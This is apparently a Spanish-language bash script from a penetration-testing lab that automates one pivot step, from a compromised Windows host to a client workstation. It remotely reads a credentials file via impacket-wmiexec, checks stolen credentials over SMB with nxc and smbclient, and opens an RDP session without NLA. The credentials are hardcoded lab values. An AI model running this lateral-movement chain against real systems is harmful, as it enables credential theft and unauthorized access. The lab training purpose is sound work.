#!/usr/bin/env bash
# ============================================================================
#  lab/chain/05-m4-to-m5.sh — salto 5: M4 (Windows) → M5 (cliente)
# ----------------------------------------------------------------------------
#  Desde la sesión de M4 (evil-winrm / wmiexec):
#    · leer C:\Transfer\credenciales.txt (clave del cliente)
#    · resolver pc-est01.uni.lab
#    · SMB contra 10.10.10.15 con nxc / smbclient
#    · RDP con xfreerdp (NLA desactivado en M5)
#
#  Uso:
#    bash lab/chain/05-m4-to-m5.sh            # imprime
#    bash lab/chain/05-m4-to-m5.sh --run      # lee credenciales, DNS y SMB
#    bash lab/chain/05-m4-to-m5.sh --run --rdp  # además abre xfreerdp (GUI)
#
#  Nota de firewall: en el diseño original M5 sólo acepta 445/5900 desde M1.
#  Si desde M4/M6 el 445 sale filtrado, el SMB se valida desde la sesión de M1
#  (salto 01) y se documenta; RDP sí está abierto a la LAN.
#
#  Credenciales de laboratorio (lab/README.md §6), datos ficticios.
# ============================================================================

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_ARTIFACTS="${LAB_ARTIFACTS:-$LAB_REPO_DIR/artifacts}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_ARTIFACTS LAB_LOG

# shellcheck source=../common/lib.sh
. "$HERE/../common/lib.sh"

LAB_ROLE=chain

RUN=0
WITH_RDP=0
M4_USER="${M4_USER:-Administrador}"
M4_PASS="${M4_PASS:-M4_Admin_2026!}"
M4_DOMAIN="${M4_DOMAIN:-uni.lab}"
M4_FILE="${M4_FILE:-C:\\Transfer\\credenciales.txt}"

M5_USER="${M5_USER:-cliente}"
M5_PASS="${M5_PASS:-Admin13.-}"

usage() {
  cat <<'EOF'
Uso: bash lab/chain/05-m4-to-m5.sh [opciones]

  --run        ejecutar (def. solo imprime)
  --rdp        abrir xfreerdp contra M5 (necesita escritorio; por defecto sólo imprime)
  -h, --help   esta ayuda

Variables: M5_USER / M5_PASS (def. cliente/Admin13.-), M4_USER / M4_PASS.
EOF
}

while (($#)); do
  case "$1" in
    --run)     RUN=1; shift ;;
    --rdp)     WITH_RDP=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "opción desconocida: $1 (ver --help)" ;;
  esac
done

# --------------------------------------------------------------- objetivo
lab_banner
step "salto 5 · M4 (${M4}) → M5 (${M5}, Windows 10)"
cat <<EOF
Objetivo: cerrar la cadena en la estación del usuario.

  a) secreto        → $M4_FILE
  b) nombre         → pc-est01.$M4_DOMAIN (registro A en el DNS de M4)
  c) SMB            → nxc / smbclient con $M5_USER
  d) escritorio     → xfreerdp (RDP sin NLA) con $M5_USER
EOF

# --------------------------------------------------------------- comandos
step "comandos exactos (en la sesión de M4, PowerShell/cmd)"
cat <<EOF
  type $M4_FILE
  nslookup pc-est01.$M4_DOMAIN
  Resolve-DnsName pc-est01.$M4_DOMAIN
  Test-NetConnection $M5 -Port 445
  Test-NetConnection $M5 -Port 3389
EOF

step "comandos exactos (desde M6/M4 con herramientas)"
cat <<EOF
  # SMB: validar la clave del cliente
  nxc smb $M5 -u '$M5_USER' -p '$M5_PASS' --shares
  smbclient -L //$M5 -U '$M5_USER%$M5_PASS'
  smbclient //$M5/C\$ -U '$M5_USER%$M5_PASS' -c 'ls'     # requiere admin

  # RDP sin NLA (certificado autofirmado del lab: /cert:ignore)
  xfreerdp /v:$M5 /u:'$M5_USER' /p:'$M5_PASS' /cert:ignore /dynamic-resolution +clipboard

  # DNS desde M6 (equivalente a resolver desde M4)
  dig +short pc-est01.$M4_DOMAIN @$M4
EOF

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se ejecuta nada. Para ejecutar: --run\n' >&2
  exit 0
fi

# --------------------------------------------------------------- ejecución
step "a) credenciales del cliente en M4 ($M4_FILE)"
if command -v impacket-wmiexec.py >/dev/null 2>&1; then
  out="$(impacket-wmiexec.py "$M4_USER:$M4_PASS@$M4" "cmd /c type $M4_FILE" 2>/dev/null || true)"
  if [[ -n "$out" ]]; then
    printf '%s\n' "$out" | sed '/^Impacket v/d; /^\[/d' | tail -n 5
    ok "archivo leído en M4"
  else
    warn "wmiexec no devolvió contenido: usar la sesión interactiva de evil-winrm"
  fi
else
  warn "sin impacket en M6: sudo apt-get install -y python3-impacket"
fi

step "b) resolución de pc-est01.$M4_DOMAIN"
if command -v dig >/dev/null 2>&1; then
  ip="$(dig +short +time=2 +tries=1 "pc-est01.$M4_DOMAIN" "@$M4" 2>/dev/null || true)"
  printf '%s\n' "${ip:-<sin respuesta>}"
  grep -q "$M5" <<<"$ip" && ok "pc-est01 resuelve a $M5" || warn "pc-est01 no resuelve a $M5 (¿zona o registro A?)"
else
  warn "sin dig: instalar dnsutils"
fi

step "c) SMB contra M5 con $M5_USER"
if command -v nxc >/dev/null 2>&1; then
  nxc smb "$M5" -u "$M5_USER" -p "$M5_PASS" --shares \
    || warn "nxc falló: puede ser firewall (M5 sólo permite 445 desde M1)"
elif command -v netexec >/dev/null 2>&1; then
  netexec smb "$M5" -u "$M5_USER" -p "$M5_PASS" --shares \
    || warn "netexec falló: puede ser firewall"
else
  warn "sin nxc/netexec: sudo apt-get install -y netexec"
fi

if command -v smbclient >/dev/null 2>&1; then
  smbclient -L "//$M5" -U "$M5_USER%$M5_PASS" -m SMB3 2>/dev/null \
    || warn "smbclient no pudo listar (¿445 filtrado desde aquí?)"
else
  warn "sin smbclient"
fi

step "d) RDP (sin NLA)"
if (( WITH_RDP )); then
  command -v xfreerdp >/dev/null 2>&1 || die "falta xfreerdp: sudo apt-get install -y freerdp2-x11"
  warn "abriendo xfreerdp: se requiere sesión gráfica en M6"
  xfreerdp /v:"$M5" /u:"$M5_USER" /p:"$M5_PASS" /cert:ignore /dynamic-resolution +clipboard &
  ok "xfreerdp lanzado en segundo plano (PID $!)"
else
  printf '  Para abrirlo: --rdp\n' >&2
fi

step "cierre"
printf '  Evidencia del salto: whoami/hostname en M5 + escritorio RDP.\n' >&2
printf '  Si SMB salió filtrado desde M6, repetir el apartado (c) desde M1 y anotarlo.\n' >&2
